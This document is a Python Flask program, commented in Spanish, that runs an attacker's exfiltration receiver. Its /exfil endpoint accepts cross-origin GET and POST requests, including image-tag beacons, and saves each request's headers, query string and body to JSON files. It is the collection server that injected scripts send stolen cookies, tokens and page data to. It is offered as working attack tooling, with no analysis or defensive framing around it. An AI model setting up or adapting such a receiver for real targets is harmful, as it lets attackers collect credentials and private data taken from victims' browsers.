from flask import Flask, request, jsonify, make_response
import os, json, time

app = Flask(__name__)

OUT = "/app/received"
os.makedirs(OUT, exist_ok=True)

def save(payload):
    fn = os.path.join(OUT, f"exfil_{int(time.time()*1000)}.json")
    with open(fn, "w") as f:
        json.dump(payload, f, indent=2)
    print("[EXFIL] recibido y guardado:", fn)
    return fn


# Manejo preflight (fetch)
@app.route("/exfil", methods=["OPTIONS"])
def exfil_options():
    resp = make_response("", 204)
    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    resp.headers["Access-Control-Allow-Headers"] = "*"
    return resp


# Exfil real
@app.route("/exfil", methods=["GET", "POST"])
def exfil():
    payload = {
        "time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "method": request.method,
        "path": request.path,
        "headers": dict(request.headers),
    }

    if request.method == "GET":
        payload["query"] = request.query_string.decode(errors="ignore")
    else:
        payload["body"] = request.get_data(as_text=True)

    save(payload)

    # RESPUESTA SIMPLE (clave para <img src>)
    resp = make_response("", 204)
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp


@app.route("/")
def index():
    return "Exfil receiver running"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9000)
